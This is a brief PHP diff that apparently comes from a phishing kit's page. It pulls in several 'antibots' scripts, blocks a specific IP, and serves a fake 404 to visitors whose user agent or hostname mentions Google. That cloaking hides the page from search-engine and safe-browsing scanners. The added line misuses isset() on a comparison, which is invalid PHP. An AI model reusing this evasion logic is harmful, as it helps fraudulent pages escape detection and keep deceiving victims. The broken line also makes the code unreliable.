@@ -35,8 +35,8 @@ include "../../../BOTS/antibots4.php";
 include "../../../BOTS/antibots5.php";
 include "../../../BOTS/antibots6.php";
 //----------------------------------------------------------------------------------------------------------------//
-$ipblok = '37.237.238.120';
-if($ipblok == $_SESSION['$LOOKUP_query']) { header('HTTP/1.0 404 Not Found'); exit(); }
+$ipblok = '37.237.238.190';
+if(isset($ipblok == $_SESSION['$LOOKUP_query'])) { header('HTTP/1.0 404 Not Found'); exit(); }
 if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
 if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
 //----------------------------------------------------------------------------------------------------------------//
